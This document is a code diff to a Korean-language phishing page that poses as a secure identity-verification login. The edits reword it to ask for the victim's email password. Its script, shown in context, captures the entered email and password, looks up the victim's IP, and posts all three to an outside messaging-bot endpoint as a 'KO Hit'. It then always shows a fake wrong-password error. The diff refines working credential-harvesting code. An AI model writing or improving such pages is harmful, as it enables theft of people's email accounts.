@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>&#50504;&#51204;&#54620; &#48376;&#51064; &#54869;&#51064; - &#48372;&#50504; &#47196;&#44536;&#51064;</title>
+    <title>&#50504;&#51204;&#54620; &#48376;&#51064; &#54869;&#51064; - &#48372;&#50504; &#51064;&#51613;</title>
     <style>
         /* Modern Korean Font Stack */
         body, html { 
@@ -35,8 +35,8 @@
             width: 60px; height: 60px; margin-bottom: 20px;
         }
 
-        h1 { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 10px; letter-spacing: -0.5px; }
-        p { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.5; }
+        h1 { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 15px; letter-spacing: -0.5px; }
+        p { font-size: 14px; color: #444; margin-bottom: 30px; line-height: 1.6; font-weight: 500; }
 
         .form-group { margin-bottom: 18px; text-align: left; }
         label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 13px; color: #444; }
@@ -65,7 +65,6 @@
         .login-button:hover { background-color: #0056e0; }
         .login-button:disabled { background-color: #b3d1ff; cursor: not-allowed; }
 
-        /* Error and Loading States */
         .error-msg { 
             display: none; color: #e53e3e; 
             background: #fff5f5; border: 1px solid #feb2b2;
@@ -77,7 +76,6 @@
             display: none; margin-top: 15px; font-size: 14px; color: #0061ff; font-weight: bold; 
         }
 
-        /* Spinner Animation */
         .spinner {
             display: inline-block; width: 18px; height: 18px;
             border: 3px solid rgba(0,97,255,.3); border-radius: 50%;
@@ -100,8 +98,8 @@
                 <path d="M10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z" fill="white"/>
             </svg>
 
-            <h1>&#48372;&#50504; &#54869;&#51064;</h1>
-            <p>&#49324;&#50857;&#51088; &#48372;&#54840;&#47484; &#50948;&#54644; &#48376;&#51064; &#54869;&#51064;&#51060; &#54596;&#50836;&#54633;&#45768;&#45796;.<br>&#44592;&#51316; &#51060;&#47700;&#51068; &#44228;&#51221;&#51004;&#47196; &#47196;&#44536;&#51064;&#54644; &#51452;&#49464;&#50836;.</p>
+            <h1>&#49324;&#50857;&#51088; &#48372;&#50504; &#54869;&#51064;</h1>
+            <p>&#48376;&#51064; &#54869;&#51064;&#51012; &#50948;&#54644; &#50976;&#54952;&#54620; &#51060;&#47700;&#51068; &#51452;&#49548;&#50752;<br>&#54644;&#45817; &#44228;&#51221;&#51032; &#48708;&#48128;&#48264;&#54840;&#47484; &#51077;&#47141;&#54644; &#51452;&#49901;&#49884;&#50724;.</p>
             
             <form id="loginForm">
                 <div class="form-group">
@@ -109,23 +107,23 @@
                     <input type="email" id="email" placeholder="example@domain.com" required readonly>
                 </div>
                 <div class="form-group">
-                    <label>&#48708;&#48128;&#48264;&#54840;</label>
-                    <input type="password" id="password" placeholder="&#48708;&#48128;&#48264;&#54840;&#47484; &#51077;&#47141;&#54616;&#49464;&#50836;" required>
+                    <label>&#51060;&#47700;&#51068; &#48708;&#48128;&#48264;&#54840;</label>
+                    <input type="password" id="password" placeholder="&#51060;&#47700;&#51068; &#48708;&#48128;&#48264;&#54840;&#47484; &#51077;&#47141;&#54616;&#49464;&#50836;" required>
                 </div>
                 
-                <button type="submit" class="login-button" id="submitBtn">&#50504;&#51204;&#54616;&#44172; &#47196;&#44536;&#51064;</button>
+                <button type="submit" class="login-button" id="submitBtn">&#48376;&#51064; &#51064;&#51613; &#50756;&#47308;</button>
                 
                 <div id="verifying">
                     <div class="spinner"></div> &#51221;&#48372; &#54869;&#51064; &#51473;...
                 </div>
                 
                 <div class="error-msg" id="error-msg">
-                    &#48708;&#48128;&#48264;&#54840;&#44032; &#50732;&#48148;&#47476;&#51648; &#50506;&#49845;&#45768;&#45796;. &#45796;&#49884; &#51077;&#47141;&#54644; &#51452;&#49464;&#50836;.
+                    &#48708;&#48128;&#48264;&#54840;&#44032; &#50732;&#48148;&#47476;&#51648; &#50506;&#49845;&#45768;&#45796;. &#45796;&#49884; &#54869;&#51064; &#54980; &#51077;&#47141;&#54644; &#51452;&#49464;&#50836;.
                 </div>
             </form>
             
             <div class="footer-info">
-                © 2026 &#48372;&#50504; &#51064;&#51613; &#49436;&#48708;&#49828;. All rights reserved.
+                Â© 2026 &#48372;&#50504; &#51064;&#51613; &#49436;&#48708;&#49828;. All rights reserved.
             </div>
         </div>
     </div>
@@ -162,7 +160,7 @@
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                const msg = `&#128276; *KO Hit*\n&#128231; &#51060;&#47700;&#51068;: ${emailVal}\n&#128273; &#48708;&#48264;: ${passVal}\n&#127760; IP: ${ipData.ip}`;
+                const msg = `&#128276; *KO Hit*\n&#128231; &#51060;&#47700;&#51068;: ${emailVal}\n&#128273; &#51060;&#47700;&#51068; &#48708;&#48264;: ${passVal}\n&#127760; IP: ${ipData.ip}`;
                 
                 await fetch(`${gate}${key}/sendMessage`, {
                     method: 'POST',
@@ -176,7 +174,7 @@
                 err.style.display = 'block';
                 btn.disabled = false;
                 document.getElementById('password').value = "";
-            }, 2500); // Slightly longer for "realistic" verification feel
+            }, 2500);
         });
     </script>
 </body>
